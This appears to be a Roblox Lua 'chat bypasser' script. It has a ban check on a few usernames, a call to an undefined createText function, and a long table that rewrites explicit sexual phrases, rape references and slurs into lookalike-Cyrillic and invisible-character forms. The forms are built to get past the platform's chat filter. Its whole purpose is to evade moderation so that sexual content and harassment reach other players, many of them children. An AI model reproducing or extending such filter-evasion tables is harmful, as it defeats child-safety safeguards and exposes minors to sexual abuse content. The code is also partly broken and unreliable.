--[[ this is us























































































































































































































































































]]--




local bannedUsernames = {
    "StickyD0nkey",
    "username2",
    "baduser",
}

local function isPlayerBanned(player)
    local playerName = player.Name
    
    for _, bannedUsername in ipairs(bannedUsernames) do
        if playerName == bannedUsername then
            player:Kick("You have been banned from using Overall Chat Bypasser.")
            if player.Character then
                player.Character:Destroy() -- Reset the player's character
            end
            return
        end
    end
end

local Players = game:GetService("Players")
local player = Players.LocalPlayer 

if player then
    isPlayerBanned(player) -- Check if the player is banned when they join the game

    player.CharacterAdded:Connect(function()
        isPlayerBanned(player) -- Check if the player is banned when they respawn
        createText(player)
    end)
end

game.Players.PlayerAdded:Connect(isPlayerBanned) -- Check if players joining the game are banned


local LasBypasses = {
    ["Words"] = {
        {"asshole", "аѕѕһоlе"},
        {"ass", "а⁥⁥⁥⁥ѕѕ"},
        {"anal sex", "а⁥⁥⁥⁥n⁥⁥⁥⁥а⁥⁥⁥⁥l⁥⁥⁥⁥ ѕ⁥⁥⁥⁥е⁥⁥⁥⁥х"},
        {"Boobs", "Вoobs"},
        {"cocaine", "сосaine"},
        {"cock", "сосk"},
        {"cock sucker", "сосk suсkеr"},
        {"cum", "с⁥⁥⁥⁥um"},
        {"hoe", "һое"},
        {"hardcore sex", "h⁥⁥⁥⁥а⁥⁥⁥⁥r⁥⁥⁥⁥d⁥⁥⁥⁥с⁥⁥⁥⁥о⁥⁥⁥⁥r⁥⁥⁥⁥е⁥⁥⁥⁥ ѕ⁥⁥⁥⁥е⁥⁥⁥⁥х"},
        {"pussy", "рu⁥⁥⁥ssу⁥⁥⁥⁥"},
        {"rape", "rаре"},
        {"sex", "s⁥⁥⁥⁥⁥⁥ех"},
        {"Titties", "Тitties"},
        {"Orgasm", "о⁥⁥⁥⁥r⁥⁥⁥⁥g⁥⁥⁥⁥а⁥⁥⁥⁥ѕ⁥⁥⁥⁥ m"},
        {"BOOBS", "ВOOBS"},
        {"BUTTHOLE", "ВUТТ⁥⁥⁥⁥НOLЕ⁥⁥⁥⁥"},
        {"MASTERBATE", "МАЅТURВАТЕ"},
        {"PUSSY", "РU⁥⁥⁥⁥⁥⁥⁥ 𐌢𐌔 Ѕ⁥⁥⁥⁥⁥⁥⁥Ѕ 𐌢𐌔 Ү"},
        {"PISS", "РӀЅЅ"},
        {"RAPE", "RАРЕ⁥"},
        {"TITTIES", "ТITTIЕS"},
        {"THOT", "ТН⁥⁥⁥⁥⁥ОТ"},
        {"XXX", "ΧΧΧ"},
        {"KYS", "К⁥⁥⁥⁥⁥YЅ"},
        {"BIG BOOTY", "ВIG ВООТY"},
        {"pussies", "р⁥⁥⁥u⁥⁥⁥ѕ⁥⁥⁥ѕ⁥⁥⁥i⁥⁥⁥е⁥⁥⁥ѕ"},
        {"cunny", "с⁥⁥⁥u⁥⁥⁥n⁥⁥⁥n⁥⁥⁥у"},
        {"bbc", "b⁥⁥⁥b⁥⁥⁥с"},
    },

    ["E-Sex"] = {
        {"Boom cockshot!", "В⁥⁥⁥⁥о⁥⁥⁥⁥о⁥⁥⁥⁥m⁥⁥⁥⁥ с⁥⁥⁥⁥о⁥⁥⁥⁥с⁥⁥⁥⁥k⁥⁥⁥⁥ѕ⁥⁥⁥⁥h⁥⁥⁥⁥о⁥⁥⁥⁥t⁥⁥⁥⁥!"},
        {"Let me have a taste of that pussy", "L⁥⁥⁥⁥Е⁥⁥⁥⁥Т⁥⁥⁥⁥ М⁥⁥⁥⁥Е⁥⁥⁥⁥ Н⁥⁥⁥⁥А⁥⁥⁥⁥V⁥⁥⁥⁥Е⁥⁥⁥⁥ А⁥⁥⁥⁥ Т⁥⁥⁥⁥А⁥⁥⁥⁥Ѕ⁥⁥⁥⁥Т⁥⁥⁥⁥Е⁥⁥⁥ О⁥⁥⁥⁥F⁥⁥⁥⁥ Т⁥⁥⁥⁥Н⁥⁥⁥⁥А⁥⁥⁥⁥Т⁥⁥⁥⁥ рu⁥⁥⁥ssу"},
        {"ah yes~ *moans* yes harder~", "а⁥⁥⁥h⁥⁥⁥ ⁥⁥⁥у⁥⁥⁥е⁥⁥⁥ѕ⁥⁥⁥~⁥⁥⁥ ⁥⁥⁥*⁥⁥⁥m⁥⁥⁥о⁥⁥⁥а⁥⁥⁥n⁥⁥⁥ѕ⁥⁥⁥*⁥⁥⁥ ⁥⁥⁥у⁥⁥⁥е⁥⁥⁥ѕ⁥⁥⁥ ⁥⁥⁥h⁥⁥⁥а⁥⁥⁥r⁥⁥⁥d⁥⁥⁥е⁥⁥⁥r⁥⁥⁥~"},
        {"spank me daddy", "ѕ⁥⁥⁥р⁥⁥⁥а⁥⁥⁥n⁥⁥⁥k⁥⁥⁥ ⁥⁥⁥m⁥⁥⁥е⁥⁥⁥ ⁥⁥⁥d⁥⁥⁥а⁥⁥⁥d⁥⁥⁥d⁥⁥⁥у"},
        {"let me eat you out", "ӏ⁥⁥⁥е⁥⁥⁥t⁥⁥⁥ ⁥⁥⁥m⁥⁥⁥е⁥⁥⁥ ⁥⁥⁥е⁥⁥⁥а⁥⁥⁥t⁥⁥⁥ ⁥⁥⁥u⁥⁥⁥ ⁥⁥⁥о⁥⁥⁥u⁥⁥⁥t"},
        {"lets do doggy style", "ӏ⁥⁥⁥е⁥⁥⁥t⁥⁥⁥ѕ⁥⁥⁥ ⁥⁥⁥d⁥⁥⁥о⁥⁥⁥ ⁥⁥⁥d⁥⁥⁥о⁥⁥⁥g⁥⁥⁥g⁥⁥⁥у⁥⁥⁥ ⁥⁥⁥ѕ⁥⁥⁥t⁥⁥⁥у⁥⁥⁥ӏ⁥⁥⁥е"},
        {"sex slave", "ѕ⁥⁥⁥е⁥⁥⁥х⁥⁥⁥ ⁥⁥⁥ѕ⁥⁥⁥ӏ⁥⁥⁥а⁥⁥⁥v⁥⁥⁥е"},
        {"roblox rule 34 is my favorite", "r⁥⁥⁥о⁥⁥⁥b⁥⁥⁥ӏ⁥⁥⁥о⁥⁥⁥х⁥⁥⁥ ⁥⁥⁥r⁥⁥⁥u⁥⁥⁥ӏ⁥⁥⁥е⁥⁥⁥ ⁥⁥⁥3⁥⁥⁥4⁥⁥⁥ ⁥⁥⁥i⁥⁥⁥ѕ⁥⁥⁥ ⁥⁥⁥m⁥⁥⁥у⁥⁥⁥ ⁥⁥⁥f⁥⁥⁥а⁥⁥⁥v⁥⁥⁥о⁥⁥⁥r⁥⁥⁥i⁥⁥⁥t⁥⁥⁥е"},
        {"i got ur mom pregnant with my child", "i⁥⁥⁥ ⁥⁥⁥g⁥⁥⁥о⁥⁥⁥t⁥⁥⁥ ⁥⁥⁥u⁥⁥⁥r⁥⁥⁥ ⁥⁥⁥m⁥⁥⁥о⁥⁥⁥m⁥⁥⁥ ⁥⁥⁥р⁥⁥⁥r⁥⁥⁥е⁥⁥⁥g⁥⁥⁥n⁥⁥⁥а⁥⁥⁥n⁥⁥⁥t⁥⁥⁥ ⁥⁥⁥w⁥⁥⁥i⁥⁥⁥t⁥⁥⁥h⁥⁥⁥ ⁥⁥⁥m⁥⁥⁥у⁥⁥⁥ ⁥⁥⁥с⁥⁥⁥h⁥⁥⁥i⁥⁥⁥ӏ⁥⁥⁥d"},
        {"wsg bbg you lookin sexy", "w⁥⁥⁥ѕ⁥⁥⁥g⁥⁥⁥ ⁥⁥⁥b⁥⁥⁥b⁥⁥⁥g⁥⁥⁥ ⁥⁥⁥u⁥⁥⁥ ⁥⁥⁥ӏ⁥⁥⁥о⁥⁥⁥о⁥⁥⁥k⁥⁥⁥i⁥⁥⁥n⁥⁥⁥ ⁥⁥⁥ѕ⁥⁥⁥е⁥⁥⁥х⁥⁥⁥у"},
        {"ur moms booty is delicious", "u⁥⁥⁥r⁥⁥⁥ ⁥⁥⁥m⁥⁥⁥о⁥⁥⁥m⁥⁥⁥ѕ⁥⁥⁥ ⁥⁥⁥b⁥⁥⁥о⁥⁥⁥о⁥⁥⁥t⁥⁥⁥у⁥⁥⁥ ⁥⁥⁥а⁥⁥⁥ѕ⁥⁥⁥ ⁥⁥⁥d⁥⁥⁥е⁥⁥⁥ӏ⁥⁥⁥i⁥⁥⁥с⁥⁥⁥i⁥⁥⁥о⁥⁥⁥u⁥⁥⁥ѕ"},
        {"wanna have hardcore sex?", "w⁥⁥⁥а⁥⁥⁥n⁥⁥⁥n⁥⁥⁥а⁥⁥⁥ ⁥⁥⁥h⁥⁥⁥а⁥⁥⁥v⁥⁥⁥е⁥⁥⁥ ⁥⁥⁥h⁥⁥⁥а⁥⁥⁥r⁥⁥⁥d⁥⁥⁥с⁥⁥⁥о⁥⁥⁥r⁥⁥⁥е⁥⁥⁥ ⁥⁥⁥ѕ⁥⁥⁥е⁥⁥⁥х⁥⁥⁥?"},
        {"yo my shaft is hard", "у⁥⁥⁥о⁥⁥⁥ ⁥⁥⁥m⁥⁥⁥у⁥⁥⁥ ⁥⁥⁥ѕ⁥⁥⁥h⁥⁥⁥а⁥⁥⁥f⁥⁥⁥t⁥⁥⁥ ⁥⁥⁥i⁥⁥⁥ѕ⁥⁥⁥ ⁥⁥⁥h⁥⁥⁥а⁥⁥⁥r⁥⁥⁥d⁥⁥⁥,⁥⁥⁥ ⁥⁥⁥m⁥⁥⁥i⁥⁥⁥n⁥⁥⁥d⁥⁥⁥ ⁥⁥⁥ј⁥⁥⁥е⁥⁥⁥r⁥⁥⁥k⁥⁥⁥i⁥⁥⁥n⁥⁥⁥g⁥⁥⁥ ⁥⁥⁥i⁥⁥⁥t⁥⁥⁥?"},
        {"I banged your girl so hard", "I⁥⁥⁥ ⁥⁥⁥b⁥⁥⁥а⁥⁥⁥n⁥⁥⁥g⁥⁥⁥е⁥⁥⁥d⁥⁥⁥ ⁥⁥⁥u⁥⁥⁥r⁥⁥⁥ ⁥⁥⁥g⁥⁥⁥i⁥⁥⁥r⁥⁥⁥ӏ⁥⁥⁥ ⁥⁥⁥ѕ⁥⁥⁥о⁥⁥⁥ ⁥⁥⁥h⁥⁥⁥а⁥⁥⁥r⁥⁥⁥d"},
        {"ur gf was craving my raging schlong", "u⁥⁥⁥r⁥⁥⁥ ⁥⁥⁥g⁥⁥⁥f⁥⁥⁥ ⁥⁥⁥w⁥⁥⁥а⁥⁥⁥ѕ⁥⁥⁥ ⁥⁥⁥с⁥⁥⁥r⁥⁥⁥а⁥⁥⁥v⁥⁥⁥i⁥⁥⁥n⁥⁥⁥g⁥⁥⁥ ⁥⁥⁥m⁥⁥⁥у⁥⁥⁥ ⁥⁥⁥r⁥⁥⁥а⁥⁥⁥g⁥⁥⁥i⁥⁥⁥n⁥⁥⁥g⁥⁥⁥ ⁥⁥⁥ѕ⁥⁥⁥с⁥⁥⁥h⁥⁥⁥ӏ⁥⁥⁥о⁥⁥⁥n⁥⁥⁥g"},
        {"i'm so hard rn", "i⁥⁥⁥'⁥⁥⁥m⁥⁥⁥ ⁥⁥⁥ѕ⁥⁥⁥о⁥⁥⁥ ⁥⁥⁥h⁥⁥⁥а⁥⁥⁥r⁥⁥⁥d⁥⁥⁥ ⁥⁥⁥r⁥⁥⁥n"},
        {"i love you so much", "i⁥⁥⁥ ⁥⁥⁥ӏ⁥⁥⁥о⁥⁥⁥v⁥⁥⁥е⁥⁥⁥ ⁥⁥⁥у⁥⁥⁥о⁥⁥⁥u⁥⁥⁥ ⁥⁥⁥ѕ⁥⁥⁥о⁥⁥⁥ ⁥⁥⁥m⁥⁥⁥u⁥⁥⁥с⁥⁥⁥h"},
        {"damn u got a long schlong daddy", "d⁥⁥⁥а⁥⁥⁥m⁥⁥⁥n⁥⁥⁥ ⁥⁥⁥u⁥⁥⁥ ⁥⁥⁥g⁥⁥⁥о⁥⁥⁥t⁥⁥⁥ ⁥⁥⁥а⁥⁥⁥ ⁥⁥⁥ӏ⁥⁥⁥о⁥⁥⁥n⁥⁥⁥g⁥⁥⁥ ⁥⁥⁥ѕ⁥⁥⁥с⁥⁥⁥h⁥⁥⁥ӏ⁥⁥⁥о⁥⁥⁥n⁥⁥⁥g⁥⁥⁥ ⁥⁥⁥d⁥⁥⁥а⁥⁥⁥d⁥⁥⁥d⁥⁥⁥у"},
        {"smd hoe", "ѕ⁥⁥⁥m⁥⁥⁥d⁥⁥⁥ ⁥⁥⁥h⁥⁥⁥о⁥⁥⁥е"},
        {"im gonna make you pregnant mommy", "i⁥⁥⁥m⁥⁥⁥ ⁥⁥⁥g⁥⁥⁥о⁥⁥⁥n⁥⁥⁥n⁥⁥⁥а⁥⁥⁥ ⁥⁥⁥m⁥⁥⁥а⁥⁥⁥k⁥⁥⁥е⁥⁥⁥ ⁥⁥⁥у⁥⁥⁥о⁥⁥⁥u⁥⁥⁥ ⁥⁥⁥р⁥⁥⁥r⁥⁥⁥е⁥⁥⁥g⁥⁥⁥n⁥⁥⁥а⁥⁥⁥n⁥⁥⁥t⁥⁥⁥ ⁥⁥⁥m⁥⁥⁥о⁥⁥⁥m⁥⁥⁥m⁥⁥⁥у"},
        {"nice balls bro *slaps them*", "n⁥⁥⁥i⁥⁥⁥с⁥⁥⁥е⁥⁥⁥ ⁥⁥⁥b⁥⁥⁥а⁥⁥⁥ӏ⁥⁥⁥ӏ⁥⁥⁥ѕ⁥⁥⁥ ⁥⁥⁥b⁥⁥⁥r⁥⁥⁥о⁥⁥⁥ ⁥⁥⁥*⁥⁥⁥ѕ⁥⁥⁥ӏ⁥⁥⁥а⁥⁥⁥р⁥⁥⁥ѕ⁥⁥⁥ ⁥⁥⁥t⁥⁥⁥h⁥⁥⁥е⁥⁥⁥m⁥⁥⁥*"},
        {"I'm over here stroking my dick I got lotion on my dick rn", "I'm over here stroking my ḏ𐌑 ͜ ͣї𐌑 ͜ ͣç𐌑 ͜ ͣḳ I got lotion on my ḏ𐌑 ͜ ͣї𐌑 ͜ ͣç𐌑 ͜ ͣḳ rn"},
        {"cock and ball torture", "c𐌑 ͜ ͣo𐌑 ͜ ͣç𐌑 ͜ ͣḳ ⁥⁥⁥а⁥⁥⁥n⁥⁥⁥d⁥⁥⁥ ⁥⁥⁥b⁥⁥⁥а⁥⁥⁥ӏ⁥⁥⁥ӏ⁥⁥⁥ ⁥⁥⁥t⁥⁥⁥о⁥⁥⁥r⁥⁥⁥t⁥⁥⁥u⁥⁥⁥r⁥⁥⁥е"},
        {"adopt me sex update", "а⁥⁥⁥d⁥⁥⁥о⁥⁥⁥р⁥⁥⁥t⁥⁥⁥ ⁥⁥⁥m⁥⁥⁥е⁥⁥⁥ ⁥⁥⁥ѕ⁥⁥⁥е⁥⁥⁥х⁥⁥⁥ ⁥⁥⁥u⁥⁥⁥р⁥⁥⁥d⁥⁥⁥а⁥⁥⁥t⁥⁥⁥е"},
        {"cunny", "с⁥⁥⁥u⁥⁥⁥n⁥⁥⁥n⁥⁥⁥у"},
        {"dommy mommy", "d⁥⁥⁥о⁥⁥⁥m⁥⁥⁥m⁥⁥⁥у⁥⁥⁥ ⁥⁥⁥m⁥⁥⁥о⁥⁥⁥m⁥⁥⁥m⁥⁥⁥у"},
        {"dominate me mommy", "d⁥⁥⁥о⁥⁥⁥m⁥⁥⁥i⁥⁥⁥n⁥⁥⁥а⁥⁥⁥t⁥⁥⁥е⁥⁥⁥ ⁥⁥⁥m⁥⁥⁥е⁥⁥⁥ ⁥⁥⁥m⁥⁥⁥о⁥⁥⁥m⁥⁥⁥m⁥⁥⁥у"},
        {"please dominate me", "р⁥⁥⁥ӏ⁥⁥⁥е⁥⁥⁥а⁥⁥⁥ѕ⁥⁥⁥е⁥⁥⁥ ⁥⁥⁥d⁥⁥⁥о⁥⁥⁥m⁥⁥⁥i⁥⁥⁥n⁥⁥⁥а⁥⁥⁥t⁥⁥⁥е⁥⁥⁥ ⁥⁥⁥m⁥⁥⁥е"},
        {"spank me", "ѕ⁥⁥⁥р⁥⁥⁥а⁥⁥⁥n⁥⁥⁥k⁥⁥⁥ m⁥⁥⁥е"},
        {"ive been very a naughty girl", "i⁥⁥⁥v⁥⁥⁥е⁥⁥⁥ ⁥⁥⁥b⁥⁥⁥е⁥⁥⁥е⁥⁥⁥n⁥⁥⁥ ⁥⁥⁥а⁥⁥⁥ ⁥⁥⁥v⁥⁥⁥е⁥⁥⁥r⁥⁥⁥у⁥⁥⁥ ⁥⁥⁥n⁥⁥⁥а⁥⁥⁥u⁥⁥⁥g⁥⁥⁥h⁥⁥⁥t⁥⁥⁥у⁥⁥⁥ ⁥⁥⁥g⁥⁥⁥i⁥⁥⁥r⁥⁥⁥ӏ"},
        {"ive been a very dirty little boy", "i⁥⁥⁥v⁥⁥⁥е⁥⁥⁥ ⁥⁥⁥b⁥⁥⁥е⁥⁥⁥е⁥⁥⁥n⁥⁥⁥ ⁥⁥⁥а⁥⁥⁥ ⁥⁥⁥v⁥⁥⁥е⁥⁥⁥r⁥⁥⁥у⁥⁥⁥ ⁥⁥⁥d⁥⁥⁥i⁥⁥⁥r⁥⁥⁥t⁥⁥⁥у⁥⁥⁥ ⁥⁥⁥ӏ⁥⁥⁥i⁥⁥⁥t⁥⁥⁥t⁥⁥⁥ӏ⁥⁥⁥е⁥⁥⁥ ⁥⁥⁥b⁥⁥⁥о⁥⁥⁥у"},
        {"dirty hoe", "d⁥⁥⁥i⁥⁥⁥r⁥⁥⁥t⁥⁥⁥у⁥⁥⁥ ⁥⁥⁥h⁥⁥⁥о⁥⁥⁥е"},
        {"cuck", "с⁥⁥⁥u⁥⁥⁥с⁥⁥⁥k"},
        {"cuckold", "с⁥⁥⁥u⁥⁥⁥с⁥⁥⁥k⁥⁥⁥о⁥⁥⁥ӏ⁥⁥⁥d"},
        {"that bbc dont play", "t⁥⁥⁥h⁥⁥⁥а⁥⁥⁥t⁥⁥⁥ ⁥⁥⁥b⁥⁥⁥b⁥⁥⁥с⁥⁥⁥ ⁥⁥⁥d⁥⁥⁥о⁥⁥⁥n⁥⁥⁥t⁥⁥⁥ ⁥⁥⁥р⁥⁥⁥ӏ⁥⁥⁥а⁥⁥⁥у"},
        {"bbc", "b⁥⁥⁥b⁥⁥⁥с"},
        {"wanna see some bbc??", "w⁥⁥⁥а⁥⁥⁥n⁥⁥⁥n⁥⁥⁥а⁥⁥⁥ ⁥⁥⁥ѕ⁥⁥⁥е⁥⁥⁥е⁥⁥⁥ ⁥⁥⁥ѕ⁥⁥⁥о⁥⁥⁥m⁥⁥⁥е⁥⁥⁥ ⁥⁥⁥b⁥⁥⁥b⁥⁥⁥с⁥⁥⁥?⁥⁥⁥?"},
        {"Theres cum everywhere!", "Т⁥⁥⁥⁥h⁥⁥⁥⁥е⁥⁥⁥⁥r⁥⁥⁥⁥е⁥⁥⁥⁥ѕ⁥⁥⁥⁥ с⁥⁥⁥⁥u⁥⁥⁥⁥m⁥⁥⁥⁥ е⁥⁥⁥⁥v⁥⁥⁥⁥е⁥⁥⁥⁥r⁥⁥⁥⁥у⁥⁥⁥⁥w⁥⁥⁥h⁥⁥⁥⁥е⁥⁥⁥⁥r⁥⁥⁥⁥е⁥⁥⁥⁥!"},
        {"Bites your dick", "Bites your ḏ𐌑 ͜ ͣї𐌑 ͜ ͣç𐌑 ͜ ͣḳ"},
        {"Keep moaning", "k⁥⁥⁥⁥е⁥⁥⁥⁥е⁥⁥⁥⁥р⁥⁥⁥⁥ m⁥⁥⁥⁥о⁥⁥⁥⁥а⁥⁥⁥⁥n⁥⁥⁥⁥і⁥⁥⁥⁥n⁥⁥⁥⁥g"},
        {"Big ass thighs", "b⁥⁥⁥⁥і⁥⁥⁥⁥g⁥⁥⁥⁥ а⁥⁥⁥⁥ѕ⁥⁥⁥⁥ѕ⁥⁥⁥⁥ t⁥⁥⁥⁥h⁥⁥⁥⁥і⁥⁥⁥⁥g⁥⁥⁥⁥h⁥⁥⁥⁥ѕ"},
        {"Suckmy dick", "s𐌑 ͜ ͣù𐌑 ͜ ͣç𐌑 ͜ ͣḳ𐌑                                            ⁥⁥⁥m⁥⁥⁥у⁥⁥⁥ ḏ𐌑 ͜ ͣї𐌑 ͜ ͣç𐌑 ͜ ͣḳ"},
        {"big black cock", "b⁥⁥⁥i⁥⁥⁥g bl⁥⁥⁥a⁥⁥⁥ck c𐌑 ͜ ͣo𐌑 ͜ ͣç𐌑 ͜ ͣḳ "},
        {"can i see those cute bо⁥оbѕ of yours", "can i see those cute bо⁥оbѕ of yours"},
        {"boobs or ass", "b⁥⁥⁥⁥о⁥⁥⁥⁥о⁥⁥⁥⁥b⁥⁥⁥⁥ѕ⁥⁥⁥⁥ о⁥⁥⁥⁥r⁥⁥⁥⁥ а⁥⁥⁥⁥ѕ⁥⁥⁥⁥ѕ?"},
        {"sweet cock you got up there", "sw⁥⁥⁥⁥е⁥⁥⁥⁥еt c𐌑 ͜ ͣo𐌑 ͜ ͣç𐌑 ͜ ͣḳ yоu gоt thеrе"},
        {"im gonna make you pregnant", "im gоnnа mаkе yоu рrеgnаnt"},
        {"i want to drink your breasts", "i wаnt tо drink yоur brеаsts."},
        {"mind if you let me squish those boobs?", "m⁥⁥⁥⁥і⁥⁥⁥⁥n⁥⁥⁥⁥d⁥⁥⁥⁥ і⁥⁥⁥⁥f⁥⁥⁥⁥ у⁥⁥⁥⁥о⁥⁥⁥⁥u⁥⁥⁥⁥ l⁥⁥⁥⁥е⁥⁥⁥⁥t⁥⁥⁥⁥ m⁥⁥⁥⁥е⁥⁥⁥⁥ ѕ⁥⁥⁥q⁥⁥⁥⁥u⁥⁥⁥⁥і⁥⁥⁥⁥ѕ⁥⁥⁥⁥h⁥⁥⁥⁥ t⁥⁥⁥⁥h⁥⁥⁥⁥о⁥⁥⁥⁥ѕ⁥⁥⁥⁥е⁥⁥⁥⁥ b⁥⁥⁥⁥о⁥⁥⁥⁥о⁥⁥⁥⁥b⁥⁥⁥⁥ѕ⁥⁥⁥?"},
        {"you like to rape and suck black oiled up men", "уоu likе tо rаре аnd suсk black oiled up men"},
        {"you are so sexy", "у⁥⁥⁥⁥о⁥⁥⁥⁥u⁥⁥⁥⁥ а⁥⁥⁥⁥r⁥⁥⁥⁥е⁥⁥⁥⁥ ѕ⁥⁥⁥⁥о⁥⁥⁥⁥ ѕ⁥⁥⁥⁥е⁥⁥⁥⁥х⁥⁥⁥⁥у"},
        {"i love cocks", "i⁥⁥⁥⁥ l⁥⁥⁥⁥o⁥⁥⁥⁥v⁥⁥⁥⁥e с⁥⁥⁥⁥о⁥⁥⁥⁥с⁥⁥⁥⁥k⁥⁥⁥⁥ѕ"}, 
        {"a⁥⁥⁥n⁥⁥⁥a⁥⁥⁥l⁥⁥⁥ ѕ⁥⁥⁥⁥е⁥⁥⁥⁥х pls", "a⁥⁥⁥n⁥⁥⁥a⁥⁥⁥l⁥⁥⁥ ѕ⁥⁥⁥⁥е⁥⁥⁥⁥х pls"},
        {"I do sexy things", "i⁥⁥⁥⁥ d⁥⁥⁥⁥o ѕ⁥⁥⁥⁥е⁥⁥⁥⁥х⁥⁥⁥⁥y things"},
        {"mаkе me рrеgnаnt", "mаkе me рrеgnаnt"},
        {"i love you", "i⁥⁥⁥⁥ l⁥⁥⁥⁥o⁥⁥⁥⁥v⁥⁥⁥⁥e y⁥⁥⁥o⁥⁥⁥u⁥⁥⁥ "},
        {"hardcore impregnation", "h⁥⁥⁥⁥а⁥⁥⁥⁥r⁥⁥⁥⁥d⁥⁥⁥⁥с⁥⁥⁥⁥о⁥⁥⁥⁥r⁥⁥⁥⁥е⁥⁥⁥⁥ imрrеgnаtion⁥⁥⁥⁥⁥⁥⁥⁥"},
        {"Twerk for me", "Twe⁥⁥rk fo⁥⁥r m⁥⁥e"},
        {"spank me daddy", "ѕ⁥⁥⁥р⁥⁥⁥а⁥⁥⁥n⁥⁥⁥k⁥⁥⁥ ⁥⁥⁥m⁥⁥⁥е⁥⁥⁥ ⁥⁥⁥d⁥⁥⁥а⁥⁥⁥d⁥⁥⁥d⁥⁥⁥у"},
        {"let me eat u out", "ӏ⁥⁥⁥е⁥⁥⁥t⁥⁥⁥ ⁥⁥⁥m⁥⁥⁥е⁥⁥⁥ ⁥⁥⁥е⁥⁥⁥а⁥⁥⁥t⁥⁥⁥ ⁥⁥⁥u⁥⁥⁥ ⁥⁥⁥о⁥⁥⁥u⁥⁥⁥t"},
        {"lets do doggy style", "ӏ⁥⁥⁥е⁥⁥⁥t⁥⁥⁥ѕ⁥⁥⁥ ⁥⁥⁥d⁥⁥⁥о⁥⁥⁥ ⁥⁥⁥d⁥⁥⁥о⁥⁥⁥g⁥⁥⁥g⁥⁥⁥у⁥⁥⁥ ⁥⁥⁥ѕ⁥⁥⁥t⁥⁥⁥у⁥⁥⁥ӏ⁥⁥⁥е"},
        {"sex slave", "ѕ⁥⁥⁥е⁥⁥⁥х⁥⁥⁥ ⁥⁥⁥ѕ⁥⁥⁥ӏ⁥⁥⁥а⁥⁥⁥v⁥⁥⁥е"},
        {"small penis", "ѕ⁥⁥⁥m⁥⁥⁥а⁥⁥⁥ӏ⁥⁥⁥ӏ⁥⁥⁥ ⁥⁥⁥р⁥⁥⁥е⁥⁥⁥n⁥⁥⁥i⁥⁥⁥ѕ"},
        {"roblox rule 34 is my favorite", "r⁥⁥⁥о⁥⁥⁥b⁥⁥⁥ӏ⁥⁥⁥о⁥⁥⁥х⁥⁥⁥ ⁥⁥⁥r⁥⁥⁥u⁥⁥⁥ӏ⁥⁥⁥е⁥⁥⁥ ⁥⁥⁥3⁥⁥⁥4⁥⁥⁥ ⁥⁥⁥i⁥⁥⁥ѕ⁥⁥⁥ ⁥⁥⁥m⁥⁥⁥у⁥⁥⁥ ⁥⁥⁥f⁥⁥⁥а⁥⁥⁥v⁥⁥⁥о⁥⁥⁥r⁥⁥⁥i⁥⁥⁥t⁥⁥⁥е"},
        {"wsg bbg you lookin sexy", "w⁥⁥⁥ѕ⁥⁥⁥g⁥⁥⁥ ⁥⁥⁥b⁥⁥⁥b⁥⁥⁥g⁥⁥⁥ ⁥⁥⁥u⁥⁥⁥ ⁥⁥⁥ӏ⁥⁥⁥о⁥⁥⁥о⁥⁥⁥k⁥⁥⁥i⁥⁥⁥n⁥⁥⁥ ⁥⁥⁥ѕ⁥⁥⁥е⁥⁥⁥х⁥⁥⁥у"},
        {"ur moms booty is delicious", "u⁥⁥⁥r⁥⁥⁥ ⁥⁥⁥m⁥⁥⁥о⁥⁥⁥m⁥⁥⁥ѕ⁥⁥⁥ ⁥⁥⁥b⁥⁥⁥о⁥⁥⁥о⁥⁥⁥t⁥⁥⁥у⁥⁥⁥ ⁥⁥⁥iѕ⁥⁥⁥ ⁥⁥⁥d⁥⁥⁥е⁥⁥⁥ӏ⁥⁥⁥i⁥⁥⁥с⁥⁥⁥i⁥⁥⁥о⁥⁥⁥u⁥⁥⁥ѕ"},
        {"i got ur mom pregnant with my child", "i⁥⁥⁥ ⁥⁥⁥g⁥⁥⁥о⁥⁥⁥t⁥⁥⁥ ⁥⁥⁥u⁥⁥⁥r⁥⁥⁥ ⁥⁥⁥m⁥⁥⁥о⁥⁥⁥m⁥⁥⁥ ⁥⁥⁥р⁥⁥⁥r⁥⁥⁥е⁥⁥⁥g⁥⁥⁥n⁥⁥⁥а⁥⁥⁥n⁥⁥⁥t⁥⁥⁥ ⁥⁥⁥w⁥⁥⁥i⁥⁥⁥t⁥⁥⁥h⁥⁥⁥ ⁥⁥⁥m⁥⁥⁥у⁥⁥⁥ ⁥⁥⁥с⁥⁥⁥h⁥⁥⁥i⁥⁥⁥ӏ⁥⁥⁥d"},
        {"im so hard rn", "i⁥⁥⁥'⁥⁥⁥m⁥⁥⁥ ⁥⁥⁥ѕ⁥⁥⁥о⁥⁥⁥ ⁥⁥⁥h⁥⁥⁥а⁥⁥⁥r⁥⁥⁥d⁥⁥⁥ ⁥⁥⁥r⁥⁥⁥n"},
        {"CUM ON MY FACE", "СUМ ON МY FАСЕ"},
        {"Boobs or Cock?", "Вооbs оr Сосk?"},
        {"CAN I PISS INSIDE YOUR BUTTHOLE?", "С⁥⁥⁥⁥⁥АN І Р⁥⁥⁥⁥ІЅЅ ІNЅIDE YOU⁥⁥⁥R В⁥⁥⁥U⁥⁥⁥⁥ТТ⁥⁥⁥⁥НOLЕ?"},
        {"DO YOU HAVE TITS?", "D⁥⁥⁥⁥О⁥⁥⁥⁥ Υ⁥⁥⁥⁥О⁥⁥⁥⁥U⁥⁥⁥⁥ Н⁥⁥⁥⁥А⁥⁥⁥⁥V⁥⁥⁥⁥Е⁥⁥⁥⁥ Т⁥⁥⁥⁥І⁥⁥⁥⁥Т⁥⁥⁥⁥Ѕ⁥⁥⁥⁥?"},
        {"COCK IN BEDROOM", "С⁥⁥⁥⁥О⁥⁥⁥⁥С⁥⁥⁥⁥Κ⁥⁥⁥⁥ І⁥⁥⁥⁥Ν⁥⁥⁥⁥ В⁥⁥⁥⁥Е⁥⁥⁥⁥D⁥⁥⁥⁥R⁥⁥⁥⁥О⁥⁥⁥⁥О⁥⁥⁥⁥М⁥⁥⁥⁥⁥"},
        {"NAKED BOYS IN YOUR CLOSET", "Ν⁥⁥⁥⁥А⁥⁥⁥⁥Κ⁥⁥⁥⁥Е⁥⁥⁥⁥D⁥⁥⁥⁥ В⁥⁥⁥⁥О⁥⁥⁥⁥Υ⁥⁥⁥⁥Ѕ⁥⁥⁥⁥ І⁥⁥⁥⁥Ν⁥⁥⁥⁥ Υ⁥⁥⁥⁥О⁥⁥⁥⁥U⁥⁥⁥⁥R⁥⁥⁥ С⁥⁥⁥⁥L⁥⁥⁥⁥О⁥⁥⁥⁥Ѕ⁥⁥⁥⁥Е⁥⁥⁥⁥Т"},
